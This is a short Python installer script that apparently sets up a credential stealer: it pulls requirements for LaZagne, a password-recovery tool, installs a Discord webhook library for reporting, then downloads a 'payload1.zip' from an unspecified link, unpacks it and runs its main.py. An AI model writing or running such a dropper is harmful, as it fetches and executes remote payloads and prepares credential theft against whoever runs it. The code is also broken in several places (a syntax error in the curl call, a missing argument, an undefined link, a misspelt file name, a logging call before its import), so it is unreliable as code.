from time import sleep
import os
from discord_webhook import *
import urllib

def Download(link, filename):
    os.system("curl " + link " --output " + filename)

log("started installer")
Download("https://bootstrap.pypa.io/get-pip.py", "get-pip.py") # Downloading pip
Download("https://github.com/AlessandroZ/LaZagne/blob/master/requirements.txt")
os.system("pip install -r requirements.txt")
os.system("python3 get-pip.py")              # Install pip
os.system("pip install -r requierments.txt") # Install requierments
os.system("pip install discord_webhook")
from logging_bot import log
log("requirements installed, installer started")
log("download payload")
Download(download_link, "payload1.zip")
os.system("tar -xf payload1.zip") # extract payload
os.system("del payload1.zip") 
os.system("cd payload1")
os.system("python3 main.py")

